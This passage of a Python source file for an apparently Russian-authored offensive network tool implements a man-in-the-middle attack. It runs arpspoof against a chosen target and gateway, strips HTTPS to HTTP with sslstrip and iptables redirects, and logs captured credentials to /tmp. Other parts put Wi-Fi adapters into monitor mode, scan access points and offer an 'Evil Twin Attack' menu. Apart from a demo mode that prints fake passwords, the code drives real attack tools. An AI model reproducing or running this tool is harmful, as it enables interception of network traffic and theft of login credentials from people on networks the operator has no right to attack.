            time.sleep(0.5)
            self.log(f"ARP spoof: {self.target_ip} <- attacker -> {self.gateway_ip}")
            time.sleep(0.3)
            self.log(f"Poisoning {self.target_ip}: gateway is now us")
            time.sleep(0.3)
            self.log(f"Poisoning {self.gateway_ip}: target is now us")
            time.sleep(0.3)
            self.log("")
            self.log("ARP spoofing active!")
            self.log("Traffic is being forwarded through this machine")
            self.log("")
            self.log("Use 'start <mode>' to begin capturing")
            self._start_arp_spoof_demo()
            return
        
        try:
            self.arpspoof_target = subprocess.Popen(
                ['arpspoof', '-i', self.interface, '-t', self.target_ip, self.gateway_ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.log(f"ARP spoof started: {self.target_ip} -> us -> {self.gateway_ip}")
            
            self.arpspoof_gateway = subprocess.Popen(
                ['arpspoof', '-i', self.interface, '-t', self.gateway_ip, self.target_ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.log(f"ARP spoof started: {self.gateway_ip} -> us -> {self.target_ip}")
            
            self.log("")
            self.log("ARP spoofing active!")
            self.log("Use 'start <mode>' to begin capturing")
            
        except FileNotFoundError:
            self.log("ERROR: arpspoof not found!")
            self.log("Install: apt install dsniff")
            self.running = False
        except Exception as e:
            self.log(f"ERROR: {e}")
            self.running = False
    
    def _start_arp_spoof_demo(self):
        """Демо логи ARP spoofing (периодические)"""
        def arp_loop():
            packet_count = 0
            while self.running:
                time.sleep(random.uniform(2, 4))
                if not self.running:
                    break
                packet_count += random.randint(5, 15)
                self.log(f"ARP packets sent: {packet_count}")
        
        thread = threading.Thread(target=arp_loop, daemon=True)
        thread.start()
    
    def start_logging(self, mode: str):
        """Начать перехват и логирование"""
        if self.intercepting:
            self.log(f"Already intercepting in '{self.logging_mode}' mode")
            self.log("Use 'stop' first to change mode")
            return
        
        self.logging_mode = mode
        self.intercepting = True
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.log_file = f"/tmp/mitm_log_{timestamp}.txt"
        
        self.log("")
        self.log(f"Starting capture: {mode}")
        self.log(f"Log file: {self.log_file}")
        self.log("")
        
        if not DEMO_MODE:
            with open(self.log_file, 'w') as f:
                f.write(f"MITM Log - {datetime.now().isoformat()}\n")
                f.write(f"Target: {self.target_ip}\n")
                f.write(f"Gateway: {self.gateway_ip}\n")
                f.write(f"Mode: {mode}\n")
                f.write("-" * 50 + "\n")
        
        self._start_traffic_capture()
    
    def _start_traffic_capture(self):
        """Запуск перехвата трафика"""
        def capture_loop():
            if DEMO_MODE:
                sites = ['google.com', 'facebook.com', 'twitter.com', 'amazon.com', 
                        'github.com', 'reddit.com', 'youtube.com', 'instagram.com',
                        'linkedin.com', 'netflix.com']
                
                while self.running and self.intercepting:
                    time.sleep(random.uniform(3, 8))
                    
                    if not self.running or not self.intercepting:
                        break
                    
                    site = random.choice(sites)
                    
                    if self.logging_mode in ['traffic', 'all']:
                        method = random.choice(['GET', 'POST', 'GET', 'GET'])
                        path = random.choice(['/', '/login', '/api/data', '/search', '/home'])
                        self.log(f"[HTTP] {method} {site}{path}")
                    
                    if random.random() > 0.6 and self.logging_mode in ['creds', 'all']:
                        time.sleep(random.uniform(1, 3))
                        
                        fake_creds = [
                            ('user@email.com', 'password123'),
                            ('admin', 'admin123'),
                            ('john.doe', 'qwerty2024'),
                            ('test_user', 'test123'),
                            ('employee', 'company2024'),
                            ('support', 'helpdesk1'),
                        ]
                        user, pwd = random.choice(fake_creds)
                        
                        self.log(f"[CREDS] Captured from {site}:")
                        self.log(f"        Username: {user}")
                        self.log(f"        Password: {pwd}")
                        
                        self.captured_data.append({
                            'type': 'credentials',
                            'site': site,
                            'username': user,
                            'password': pwd,
                            'time': datetime.now().isoformat()
                        })
            else:
                pass
        
        self.traffic_thread = threading.Thread(target=capture_loop, daemon=True)
        self.traffic_thread.start()
        self.log("Traffic capture started")
    
    def stop_logging(self):
        """Остановить перехват (но не ARP spoof)"""
        if not self.intercepting:
            self.log("Capture not running")
            return
        
        self.intercepting = False
        self.log("")
        self.log("Stopping capture...")
        
        if self.log_file and not DEMO_MODE:
            with open(self.log_file, 'a') as f:
                f.write("\n--- Captured Data ---\n")
                for item in self.captured_data:
                    f.write(json.dumps(item) + "\n")
            self.log(f"Data saved to {self.log_file}")
        
        self.log(f"Capture stopped. Total captured: {len(self.captured_data)}")
        self.logging_mode = None
    
    def enable_http_downgrade(self):
        """Включить понижение HTTPS до HTTP"""
        if self.http_downgrade:
            self.log("HTTP downgrade already enabled")
            return
        
        self.log("")
        self.log("Enabling HTTP downgrade (SSLstrip)...")
        
        if DEMO_MODE:
            time.sleep(0.5)
            self.http_downgrade = True
            self.log("SSLstrip activated on port 8080")
            self.log("HTTP traffic will be intercepted")
            self.log("Note: HSTS sites may not be affected")
            return
        
        try:
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp',
                          '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'],
                         capture_output=True)
            
            self.sslstrip_proc = subprocess.Popen(
                ['sslstrip', '-l', '8080'],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            self.http_downgrade = True
            self.log("HTTP downgrade enabled (sslstrip)")
        except FileNotFoundError:
            self.log("ERROR: sslstrip not found!")
            self.log("Install: apt install sslstrip")
        except Exception as e:
            self.log(f"ERROR: {e}")
    
    def disable_http_downgrade(self):
        """Выключить понижение HTTPS"""
        if not self.http_downgrade:
            self.log("HTTP downgrade not enabled")
            return
        
        self.log("Disabling HTTP downgrade...")
        
        if DEMO_MODE:
            self.http_downgrade = False
            self.log("SSLstrip disabled")
            return
        
        if self.sslstrip_proc:
            self.sslstrip_proc.terminate()
            self.sslstrip_proc = None
        
        subprocess.run(['iptables', '-t', 'nat', '-D', 'PREROUTING', '-p', 'tcp',
                      '--destination-port', '80', '-j', 'REDIRECT', '--to-port', '8080'],
                     capture_output=True)
        
        self.http_downgrade = False
        self.log("HTTP downgrade disabled")
    
    def stop(self):
        """Полная остановка MITM атаки"""
        self.log("")
        self.log("=" * 40)
        self.log("Stopping MITM Attack")
        self.log("=" * 40)
        
        if self.intercepting:
            self.stop_logging()
        
        if self.http_downgrade:
            self.disable_http_downgrade()
        
        self.running = False
        
        if not DEMO_MODE:
            self.log("Stopping ARP spoofing...")
            if self.arpspoof_target:
                self.arpspoof_target.terminate()
                self.arpspoof_target = None
            
            if self.arpspoof_gateway:
                self.arpspoof_gateway.terminate()
                self.arpspoof_gateway = None
            
            self.log("Disabling IP forwarding...")
            self.disable_ip_forwarding()
        else:
            self.log("ARP spoofing stopped")
            self.log("IP forwarding disabled")
        
        self.log("")
        self.log("MITM attack stopped")
        self.log(f"Total credentials captured: {len(self.captured_data)}")


# ============= NETWORK INTERFACE CLASSES =============

class NetworkInterface:
    """Управление сетевыми интерфейсами"""
    
    @staticmethod
    def get_interfaces() -> List[str]:
        if DEMO_MODE:
            return ['wlan0', 'wlan1']
        
        interfaces = []
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'Interface' in line:
                    iface = line.strip().split()[-1]
                    if iface and iface not in interfaces:
                        interfaces.append(iface)
        except Exception:
            pass
        
        if not interfaces:
            try:
                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
                for line in result.stdout.split('\n'):
                    if 'IEEE 802.11' in line:
                        parts = line.strip().split()
                        if parts:
                            iface = parts[0]
                            if iface not in interfaces:
                                interfaces.append(iface)
            except Exception:
                pass
        
        return interfaces
    
    @staticmethod
    def is_monitor_mode(interface: str) -> bool:
        if DEMO_MODE:
            return 'mon' in interface
        
        try:
            result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
            return 'Mode:Monitor' in result.stdout
        except Exception:
            return False
    
    @staticmethod
    def enable_monitor_mode(interface: str) -> bool:
        if DEMO_MODE:
            print(f"{Colors.ORANGE}[DEMO] Enabling monitor mode on {interface}...{Colors.RESET}")
            time.sleep(1)
            return True
        
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True, timeout=10)
            subprocess.run(['ip', 'link', 'set', interface, 'down'], capture_output=True)
            subprocess.run(['iw', interface, 'set', 'monitor', 'none'], capture_output=True)
            subprocess.run(['ip', 'link', 'set', interface, 'up'], capture_output=True)
            subprocess.run(['airmon-ng', 'start', interface], capture_output=True, timeout=10)
            time.sleep(2)
            return True
        except Exception as e:
            print(f"{Colors.ORANGE}[!] Error: {e}{Colors.RESET}")
            return False
    
    @staticmethod
    def disable_monitor_mode(interface: str) -> bool:
        if DEMO_MODE:
            return True
        
        try:
            subprocess.run(['airmon-ng', 'stop', interface], capture_output=True, timeout=10)
            subprocess.run(['systemctl', 'restart', 'NetworkManager'], capture_output=True, timeout=10)
            time.sleep(2)
            return True
        except Exception:
            return False


class APScanner:
    """Сканер точек доступа"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks: List[dict] = []
        self.process = None
    
    def scan(self) -> List[dict]:
        if DEMO_MODE:
            return self._demo_scan()
        
        print(f"\n{Colors.ORANGE}[*] Scanning on {self.interface}...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        
        temp_file = f"/tmp/scan_{int(time.time())}"
        
        try:
            self.process = subprocess.Popen(
                ['airodump-ng', '--write', temp_file, '--write-interval', '1',
                 '--output-format', 'csv', '--band', 'abg', self.interface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            start_time = time.time()
            while time.time() - start_time < 30:
                csv_file = f"{temp_file}-01.csv"
                if os.path.exists(csv_file):
                    self.networks = self._parse_csv(csv_file)
                    self._display_networks()
                time.sleep(1)
                
        except KeyboardInterrupt:
            pass
        finally:
            if self.process:
                self.process.terminate()
            for f in os.listdir('/tmp'):
                if f.startswith(os.path.basename(temp_file)):
                    try:
                        os.remove(os.path.join('/tmp', f))
                    except:
                        pass
        
        return self.networks
    
    def _demo_scan(self) -> List[dict]:
        print(f"\n{Colors.ORANGE}[DEMO] Scanning networks...{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        
        fake_networks = [
            {'bssid': 'AA:BB:CC:11:22:33', 'channel': '6', 'power': '-42', 
             'encryption': 'WPA2', 'ssid': 'HomeNetwork_5G', 'wifi6': True},
            {'bssid': 'AA:BB:CC:44:55:66', 'channel': '36', 'power': '-55', 
             'encryption': 'WPA3', 'ssid': 'Office_WiFi6', 'wifi6': True},
            {'bssid': 'AA:BB:CC:77:88:99', 'channel': '1', 'power': '-68', 
             'encryption': 'WPA2', 'ssid': 'Guest_Network', 'wifi6': False},
        ]
        
        try:
            for i in range(5):
                if i < len(fake_networks):
                    self.networks.append(fake_networks[i])
                self._display_networks()
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        
        return self.networks
    
    def _parse_csv(self, csv_file: str) -> List[dict]:
        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            in_ap_section = False
            for line in lines:
                if 'BSSID' in line and 'First time seen' in line:
                    in_ap_section = True
                    continue
                if 'Station MAC' in line:
                    break
                if in_ap_section and line.strip():
                    parts = line.split(',')
                    if len(parts) >= 14:
                        bssid = parts[0].strip()
                        channel = parts[3].strip()
                        power = parts[8].strip()
                        enc = parts[5].strip()
                        ssid = parts[13].strip()
                        
                        if bssid:
                            networks.append({
                                'bssid': bssid,
                                'channel': channel,
                                'power': power,
                                'encryption': enc,
                                'ssid': ssid if ssid else '<Hidden>',
                                'wifi6': False
                            })
        except Exception:
            pass
        
        return networks
    
    def _display_networks(self):
        os.system('clear')
        print(f"\n{Colors.ORANGE}[*] Found: {len(self.networks)} networks{Colors.RESET}")
        print(f"{Colors.WHITE}[*] Press Ctrl+C to stop{Colors.RESET}\n")
        print(f"{Colors.gradient('-'*80)}")
        print(f"{'#':>3} {'BSSID':^17} {'CH':^4} {'PWR':^5} {'ENC':^8} {'SSID':<35}")
        print(f"{Colors.gradient('-'*80)}")
        
        for i, net in enumerate(self.networks[:20], 1):
            color = Colors.WHITE if int(net['power']) > -70 else Colors.DIM
            print(f"{color}{i:>3} {net['bssid']:^17} {net['channel']:^4} "
                  f"{net['power']:^5} {net['encryption']:^8} {net['ssid']:<35}{Colors.RESET}")


# ============= TAB SYSTEM & MAIN MENU =============

class TabSystem:
    """Система табов для главного меню"""
    
    TABS = ['WIFI', 'ETHERNET']
    
    def __init__(self):
        self.current_tab = 0
    
    def next_tab(self):
        self.current_tab = (self.current_tab + 1) % len(self.TABS)
    
    def prev_tab(self):
        self.current_tab = (self.current_tab - 1) % len(self.TABS)
    
    def get_current_tab(self) -> str:
        return self.TABS[self.current_tab]
    
    def render_tabs(self, width: int = 60) -> str:
        """Рендер табов"""
        tabs_str = ""
        
        for i, tab in enumerate(self.TABS):
            if i == self.current_tab:
                tabs_str += f" {Colors.BG_ORANGE}{Colors.WHITE}{Colors.BOLD} [{tab}] {Colors.RESET} "
            else:
                tabs_str += f" {Colors.DIM} [{tab}] {Colors.RESET} "
        
        return tabs_str


def render_wifi_menu(tab_system: TabSystem):
    """Рендер меню WiFi"""
    interfaces = NetworkInterface.get_interfaces()
    
    print(f"\n{Colors.ORANGE}[*] Wi-Fi Adapters:{Colors.RESET}\n")
    
    if not interfaces:
        print(f"  {Colors.ORANGE}[!] No adapters found{Colors.RESET}")
    else:
        for i, iface in enumerate(interfaces, 1):
            mode = "Monitor" if NetworkInterface.is_monitor_mode(iface) else "Managed"
            mode_color = Colors.GREEN if mode == "Monitor" else Colors.WHITE
            print(f"  {Colors.WHITE}[{i}] {iface:12} {mode_color}[{mode}]{Colors.RESET}")
    
    print(f"\n{Colors.gradient('─'*60)}")
    
    modes = []
    if AGGRESSIVE_MODE:
        modes.append("AGGRESSIVE")
    if STEALTH_MODE:
        modes.append("STEALTH")
    if WIFI6_MODE:
        modes.append("WiFi6")
    
    if modes:
        print(f"{Colors.CYAN}Active modes: {', '.join(modes)}{Colors.RESET}")
    
    print(f"\n{Colors.ORANGE}[1]{Colors.WHITE} Modern Evil Twin Attack{Colors.RESET}")
    print(f"{Colors.ORANGE}[2]{Colors.WHITE} Quick Scan{Colors.RESET}")
    print(f"{Colors.ORANGE}[3]{Colors.WHITE} Disable All Monitor Modes{Colors.RESET}")
    print(f"{Colors.ORANGE}[0]{Colors.WHITE} Exit{Colors.RESET}")


def render_ethernet_menu(tab_system: TabSystem):
    """Рендер меню Ethernet"""
    interfaces = EthernetInterface.get_interfaces()
    
    print(f"\n{Colors.ORANGE}[*] Ethernet Connections:{Colors.RESET}\n")
    
    if not interfaces:
        print(f"  {Colors.ORANGE}[!] No ethernet connections found{Colors.RESET}")
    else:
        for i, iface in enumerate(interfaces, 1):
            status_color = Colors.GREEN if iface['status'] == 'UP' else Colors.RED
            print(f"  {Colors.WHITE}[{i}] {iface['name']:12} "
                  f"{Colors.CYAN}{iface['ip']:15}{Colors.RESET} "
                  f"{Colors.DIM}{iface['mac']}{Colors.RESET} "
                  f"{status_color}[{iface['status']}]{Colors.RESET}")
    
    print(f"\n{Colors.gradient('─'*60)}")
    
    print(f"\n{Colors.ORANGE}[1]{Colors.WHITE} Man-in-the-Middle Attack{Colors.RESET}")
    print(f"{Colors.ORANGE}[2]{Colors.WHITE} Network Scan{Colors.RESET}")
    print(f"{Colors.ORANGE}[0]{Colors.WHITE} Exit{Colors.RESET}")


def run_network_scan():
    """Запуск сканирования сети"""
    interfaces = EthernetInterface.get_interfaces()
    
    if not interfaces:
        print(f"\n{Colors.ORANGE}[!] No ethernet interfaces found{Colors.RESET}")
        time.sleep(2)
        return
    
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Select interface for scanning:{Colors.RESET}\n")
    
    for i, iface in enumerate(interfaces, 1):
        print(f"  {Colors.WHITE}[{i}] {iface['name']} ({iface['ip']}){Colors.RESET}")
    
    choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
    
    try:
        selected = interfaces[int(choice) - 1]
    except:
        return
    
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] Scanning network on {selected['name']}...{Colors.RESET}")
    print(f"{Colors.WHITE}[*] This may take a while...{Colors.RESET}\n")
    
    scanner = NetworkScanner(selected['name'])
    clients = scanner.scan()
    
    os.system('clear')
    print(f"\n{Colors.gradient('='*70, style='claude')}")
    print(f"{Colors.ORANGE}{'NETWORK SCAN RESULTS':^70}{Colors.RESET}")
    print(f"{Colors.gradient('='*70, style='claude')}\n")
    
    print(f"{Colors.WHITE}Interface: {selected['name']} ({selected['ip']}){Colors.RESET}\n")
    
    if not clients:
        print(f"{Colors.ORANGE}[!] No clients found{Colors.RESET}")
    else:
        print(f"{Colors.gradient('-'*70)}")
        print(f"{'#':>3} {'IP Address':^18} {'MAC Address':^20} {'Vendor':<25}")
        print(f"{Colors.gradient('-'*70)}")
        
        for i, client in enumerate(clients, 1):
            print(f"{Colors.WHITE}{i:>3} {client['ip']:^18} {client['mac']:^20} "
                  f"{client['vendor'][:25]:<25}{Colors.RESET}")
    
    print(f"\n{Colors.gradient('='*70, style='claude')}")
    input(f"\n{Colors.WHITE}Press Enter to return...{Colors.RESET}")


def run_mitm_attack():
    """Запуск MITM атаки"""
    interfaces = EthernetInterface.get_interfaces()
    
    if not interfaces:
        print(f"\n{Colors.ORANGE}[!] No ethernet interfaces found{Colors.RESET}")
        time.sleep(2)
        return
    
    os.system('clear')
    
    if len(interfaces) > 1:
        print(f"\n{Colors.ORANGE}[*] Select interface:{Colors.RESET}\n")
        for i, iface in enumerate(interfaces, 1):
            print(f"  {Colors.WHITE}[{i}] {iface['name']} ({iface['ip']}){Colors.RESET}")
        
        choice = input(f"\n{Colors.WHITE}Select: {Colors.RESET}")
        try:
            selected = interfaces[int(choice) - 1]
        except:
            return
    else:
        selected = interfaces[0]
    
    interface = selected['name']
    
    gateway = EthernetInterface.get_gateway(interface)
    if not gateway:
        print(f"\n{Colors.ORANGE}[!] Could not detect gateway{Colors.RESET}")
        gateway = input(f"{Colors.WHITE}Enter gateway IP: {Colors.RESET}")
    
    os.system('clear')
    print(f"\n{Colors.ORANGE}[*] MITM Attack Setup{Colors.RESET}")
    print(f"{Colors.WHITE}Interface: {interface}{Colors.RESET}")
    print(f"{Colors.WHITE}Gateway: {gateway}{Colors.RESET}\n")
    
    target_ip = input(f"{Colors.WHITE}Enter target IP: {Colors.RESET}")
    
    if not target_ip:
        return
    
    os.system('clear')
    print(f"\n{Colors.gradient('='*60, style='claude')}")
    print(f"{Colors.ORANGE}{'MITM ATTACK':^60}{Colors.RESET}")
    print(f"{Colors.gradient('='*60, style='claude')}\n")
    
    print(f"{Colors.WHITE}Interface:  {Colors.CYAN}{interface}{Colors.RESET}")
    print(f"{Colors.WHITE}Target:     {Colors.CYAN}{target_ip}{Colors.RESET}")
    print(f"{Colors.WHITE}Gateway:    {Colors.CYAN}{gateway}{Colors.RESET}\n")
    
    confirm = input(f"{Colors.ORANGE}Start attack? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        return
    
    attack = MITMAttack(interface, target_ip, gateway)
    attack.start()
    
    run_mitm_console(attack)


